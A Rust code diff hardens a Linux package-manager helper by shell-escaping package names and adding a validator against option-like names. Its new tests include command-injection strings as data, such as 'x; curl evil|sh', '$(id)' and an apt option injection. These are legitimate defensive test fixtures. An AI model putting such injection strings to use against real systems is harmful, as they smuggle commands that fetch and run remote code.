@@ -9,6 +9,7 @@ use std::time::Duration;
 use crate::command::HostCommand;
 use crate::host::Host;
 use crate::pkg_output::PkgMgrFamily;
+use crate::shell::{BashShell, HostShell};
 
 #[derive(Debug, Clone, Copy, PartialEq, Eq, Hash)]
 pub enum LinuxPackageManager {
@@ -60,9 +61,19 @@ impl LinuxPackageManager {
         }
     }
 
+    /// 包名只收发行版仓库里会出现的字符。首字符必须是字母或数字：引号挡得住 shell 注入，
+    /// 挡不住 `-o ...` 这种被 apt / dnf 当成选项的名字，从前端传进来的包名要先过这一关
+    pub fn is_valid_package_name(name: &str) -> bool {
+        let mut chars = name.chars();
+        matches!(chars.next(), Some(c) if c.is_ascii_alphanumeric())
+            && chars.all(|c| {
+                c.is_ascii_alphanumeric() || matches!(c, '.' | '_' | '+' | '-' | ':' | '@' | '=' | '~')
+            })
+    }
+
     /// 非交互安装的 shell 片段
     pub fn install_script(self, packages: &[&str]) -> String {
-        let pkgs = packages.join(" ");
+        let pkgs = join_packages(packages);
         match self {
             Self::Apt => format!("DEBIAN_FRONTEND=noninteractive apt-get install -y -qq {pkgs}"),
             Self::Dnf => format!("dnf install -y {pkgs}"),
@@ -73,7 +84,7 @@ impl LinuxPackageManager {
     }
 
     pub fn remove_script(self, packages: &[&str]) -> String {
-        let pkgs = packages.join(" ");
+        let pkgs = join_packages(packages);
         match self {
             Self::Apt => format!("DEBIAN_FRONTEND=noninteractive apt-get remove -y {pkgs}"),
             Self::Dnf => format!("dnf remove -y {pkgs}"),
@@ -85,7 +96,7 @@ impl LinuxPackageManager {
 
     /// 给用户手动执行看的一行(不带 sudo,由文案自己加)
     pub fn install_hint(self, packages: &[&str]) -> String {
-        let pkgs = packages.join(" ");
+        let pkgs = join_packages(packages);
         match self {
             Self::Apt => format!("apt-get install -y {pkgs}"),
             Self::Dnf => format!("dnf install -y {pkgs}"),
@@ -113,6 +124,15 @@ impl LinuxPackageManager {
 
 fn sh(script: &str) -> HostCommand {
     HostCommand::new("sh").arg("-c").arg(script)
+}
+
+// 整段脚本交给 sh -c 跑，还要带 sudo，每个包名都得单独成一个 token
+fn join_packages(packages: &[&str]) -> String {
+    packages
+        .iter()
+        .map(|p| BashShell.escape(p))
+        .collect::<Vec<_>>()
+        .join(" ")
 }
 
 impl std::fmt::Display for LinuxPackageManager {
@@ -146,6 +166,24 @@ mod tests {
     fn family_maps_yum_to_dnf_parser() {
         assert_eq!(LinuxPackageManager::Yum.family(), PkgMgrFamily::Dnf);
         assert_eq!(LinuxPackageManager::Apk.family(), PkgMgrFamily::Other);
+    }
+
+    #[test]
+    fn package_names_cannot_break_out_of_the_script() {
+        let script = LinuxPackageManager::Apt.install_script(&["libnss3", "x; curl evil|sh"]);
+        assert!(script.ends_with("libnss3 'x; curl evil|sh'"));
+        let script = LinuxPackageManager::Dnf.remove_script(&["it's"]);
+        assert!(script.ends_with("'it'\\''s'"));
+    }
+
+    #[test]
+    fn package_name_validation() {
+        for ok in ["libnss3", "libstdc++6", "libasound2t64", "gtk3:amd64", "py3-pip@edge", "nodejs=20.1-r0"] {
+            assert!(LinuxPackageManager::is_valid_package_name(ok), "{ok}");
+        }
+        for bad in ["", "-oDebug::pkgProblemResolver=1", "a b", "a;b", "$(id)", "a/b", "../x"] {
+            assert!(!LinuxPackageManager::is_valid_package_name(bad), "{bad}");
+        }
     }
 
     #[test]
